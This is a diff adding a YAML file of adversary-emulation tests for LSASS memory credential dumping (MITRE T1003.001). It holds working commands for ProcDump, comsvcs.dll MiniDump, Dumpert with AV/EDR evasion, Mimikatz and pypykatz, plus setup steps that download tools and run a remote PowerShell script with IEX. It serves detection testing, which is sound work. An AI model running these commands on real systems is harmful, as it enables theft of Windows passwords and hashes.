@@ -1,0 +1,210 @@
+attack_technique:
+- T1003.001
+display_name: "OS Credential Dumping: LSASS Memory"
+atomic_tests:
+- name: Windows Credential Editor
+  description: "Dump user credentials using Windows Credential Editor (supports Windows XP, 2003, Vista, 7, 2008 and Windows 8 only)\n\nUpon successful execution, you should see a file with user passwords/hashes at %temp%/wce-output.file.\n\nIf you see no output it is likely that execution was blocked by Anti-Virus. \n\nIf you see a message saying \"wce.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install Windows Credential Editor first.\n"
+  supported_platforms:
+  - windows
+  input_arguments:
+    output_file:
+      description: Path where resulting data should be placed
+      type: Path
+      default: '%temp%\wce-output.txt'
+    wce_zip_hash:
+      description: File hash of the Windows Credential Editor zip file
+      type: String
+      default: 8F4EFA0DDE5320694DD1AA15542FE44FDE4899ED7B3A272063902E773B6C4933
+    wce_exe:
+      description: Path of Windows Credential Editor executable
+      type: Path
+      default: PathToAtomicsFolder\T1003.001\bin\wce.exe
+    wce_url:
+      description: Path to download Windows Credential Editor zip file
+      type: url
+      default: https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Windows Credential Editor must exist on disk at specified location (#{wce_exe})
+    prereq_command: |
+      if (Test-Path #{wce_exe}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      $parentpath = Split-Path "#{wce_exe}"; $zippath = "$parentpath\wce.zip"
+      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+      if(Invoke-WebRequestVerifyHash "#{wce_url}" "$zippath" #{wce_zip_hash}){
+        Expand-Archive $zippath $parentpath\wce -Force
+        Move-Item $parentpath\wce\wce.exe "#{wce_exe}"
+        Remove-Item $zippath, $parentpath\wce -Recurse
+      }
+  executor:
+    command: |
+      #{wce_exe} -o #{output_file}
+    cleanup_command: del "#{output_file}" >nul 2>&1
+    name: command_prompt
+    elevation_required: true
+  
+- name: Dump LSASS.exe Memory using ProcDump
+  description: |
+    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
+    ProcDump.
+
+    Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.
+
+    If you see a message saying "procdump.exe is not recognized as an internal or external command", try using the  get-prereq_commands to download and install the ProcDump tool first.
+  supported_platforms:
+  - windows
+  input_arguments:
+    output_file:
+      description: Path where resulting dump should be placed
+      type: Path
+      default: C:\Windows\Temp\lsass_dump.dmp
+    procdump_exe:
+      description: Path of Procdump executable
+      type: Path
+      default: PathToAtomicsFolder\T1003.001\bin\procdump.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})
+    prereq_command: |
+      if (Test-Path #{procdump_exe}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\Procdump.zip"
+      Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
+      New-Item -ItemType Directory (Split-Path #{procdump_exe}) -Force | Out-Null
+      Copy-Item $env:TEMP\Procdump\Procdump.exe #{procdump_exe} -Force
+  executor:
+    command: |
+      #{procdump_exe} -accepteula -ma lsass.exe #{output_file}
+    cleanup_command: |
+      del "#{output_file}" >nul 2> nul
+    name: command_prompt
+    elevation_required: true
+
+- name: Dump LSASS.exe Memory using comsvcs.dll
+  description: |
+    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.
+
+    Upon successful execution, you should see the following file created $env:TEMP\lsass-comsvcs.dmp.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full
+    cleanup_command: |
+      Remove-Item $env:TEMP\lsass-comsvcs.dmp -ErrorAction Ignore
+    name: powershell
+    elevation_required: true
+
+- name: Dump LSASS.exe Memory using direct system calls and API unhooking
+  description: "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. \nhttps://github.com/outflanknl/Dumpert\nhttps://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\nUpon successful execution, you should see the following file created C:\\windows\\temp\\dumpert.dmp.\n\nIf you see a message saying \"The system cannot find the path specified.\", try using the  get-prereq_commands to download the  tool first.\n"
+  supported_platforms:
+  - windows
+  input_arguments:
+    dumpert_exe:
+      description: Path of Dumpert executable
+      type: Path
+      default: PathToAtomicsFolder\T1003.001\bin\Outflank-Dumpert.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Dumpert executable must exist on disk at specified location (#{dumpert_exe})
+    prereq_command: |
+      if (Test-Path #{dumpert_exe}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -ItemType Directory (Split-Path #{dumpert_exe}) -Force | Out-Null
+      Invoke-WebRequest "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe" -OutFile #{dumpert_exe}
+  executor:
+    command: |
+      #{dumpert_exe}
+    cleanup_command: |
+      del C:\windows\temp\dumpert.dmp >nul 2> nul
+    name: command_prompt
+    elevation_required: true
+- name: Dump LSASS.exe Memory using Windows Task Manager
+  description: |
+    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task
+    Manager and administrative permissions.
+  supported_platforms:
+  - windows
+  executor:
+    steps: |
+      1. Open Task Manager:
+        On a Windows system this can be accomplished by pressing CTRL-ALT-DEL and selecting Task Manager or by right-clicking
+        on the task bar and selecting "Task Manager".
+
+      2. Select lsass.exe:
+        If lsass.exe is not visible, select "Show processes from all users". This will allow you to observe execution of lsass.exe
+        and select it for manipulation.
+
+      3. Dump lsass.exe memory:
+        Right-click on lsass.exe in Task Manager. Select "Create Dump File". The following dialog will show you the path to the saved file.
+    name: manual
+- name: Offline Credential Theft With Mimikatz
+  description: |
+    The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with
+    Mimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.
+  supported_platforms:
+  - windows
+  input_arguments:
+    input_file:
+      description: Path of the Lsass dump
+      type: Path
+      default: '%tmp%\lsass.DMP'
+    mimikatz_exe:
+      description: Path of the Mimikatz binary
+      type: string
+      default: PathToAtomicsFolder\T1003.001\bin\mimikatz.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Mimikatz must exist on disk at specified location (#{mimikatz_exe})
+    prereq_command: |
+      if (Test-Path #{mimikatz_exe}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200308/mimikatz_trunk.zip" -OutFile "$env:TEMP\Mimi.zip"
+      Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
+      New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
+      Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
+  - description: |
+      Lsass dump must exist at specified location (#{input_file})
+    prereq_command: |
+      cmd /c "if not exist #{input_file} (exit /b 1)"
+    get_prereq_command: |
+      Write-Host "Create the lsass dump manually using the steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)"
+  executor:
+    command: |
+      #{mimikatz_exe} "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords full" exit
+    name: command_prompt
+    elevation_required: true
+
+- name: LSASS read with pypykatz
+  description: "Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::\n\nPython 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.\n\nSuccessful execution of this test will display multiple useranames and passwords/hashes to the screen.\n  \n"
+  supported_platforms:
+  - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Computer must have python 3 installed
+    prereq_command: |
+      if (python --version) {exit 0} else {exit 1}
+    get_prereq_command: |
+      echo "Python 3 must be installed manually"
+  - description: |
+      Computer must have pip installed
+    prereq_command: |
+      if (pip3 -V) {exit 0} else {exit 1}
+    get_prereq_command: |
+      echo "PIP must be installed manually"
+  - description: |
+      pypykatz must be installed and part of PATH
+    prereq_command: |
+      if (cmd /c pypykatz -h) {exit 0} else {exit 1}
+    get_prereq_command: |
+      pip3 install pypykatz
+  executor:
+    command: |
+      pypykatz live lsa
+    name: command_prompt
+    elevation_required: true
